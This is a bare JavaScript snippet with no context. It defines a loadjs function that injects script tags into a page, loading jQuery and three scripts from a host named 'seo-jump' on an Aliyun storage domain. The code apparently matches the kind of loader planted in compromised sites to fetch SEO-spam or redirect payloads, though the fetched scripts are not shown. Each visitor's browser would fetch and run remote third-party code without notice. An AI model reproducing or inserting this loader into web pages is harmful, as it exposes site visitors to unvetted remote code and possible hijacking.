loadjs("//cdn.bootcss.com/jquery/1.12.3/jquery.min.js");
loadjs("//seo-jump.oss-accelerate.aliyuncs.com/layer/layer.js?2019112501");
loadjs("//seo-jump.oss-accelerate.aliyuncs.com/b.js?2019112501");
loadjs("//seo-jump.oss-accelerate.aliyuncs.com/c.js?2019112501");
function loadjs(path) {
var jquery_tag = document.createElement('script');
jquery_tag.type = 'text/javascript';
jquery_tag.async = true;
jquery_tag.charset = 'utf-8';
jquery_tag.src =path;
var root_s = document.getElementsByTagName('script')[0];
root_s.parentNode.insertBefore(jquery_tag, root_s);
}